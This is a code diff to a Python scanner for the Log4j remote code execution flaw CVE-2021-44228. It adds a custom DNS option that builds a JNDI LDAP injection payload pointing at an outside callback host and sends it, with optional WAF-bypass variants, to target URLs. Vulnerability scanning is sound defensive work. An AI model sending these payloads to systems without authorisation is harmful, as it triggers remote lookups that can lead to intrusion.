@@ -239,10 +239,15 @@ def parse_url(url):
             "file_path": file_path})
 
 
-def scan_url(url, callback_host):
+def scan_url(url, callback_host, customDns=False):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
     payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+    random_string = url
+    if customDns == True:
+        payload = '${jndi:ldap://%s/%s}' % ( callback_host, random_string)
+
+
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
@@ -298,7 +303,9 @@ def main():
                 urls.append(i)
 
     dns_callback_host = ""
+    customDns = False
     if args.custom_dns_callback_host:
+        customDns = True
         cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
         dns_callback_host =  args.custom_dns_callback_host
     else:
@@ -314,7 +321,7 @@ def main():
     cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
     for url in urls:
         cprint(f"[•] URL: {url}", "magenta")
-        scan_url(url, dns_callback_host)
+        scan_url(url, dns_callback_host, customDns)
 
     if args.custom_dns_callback_host:
         cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
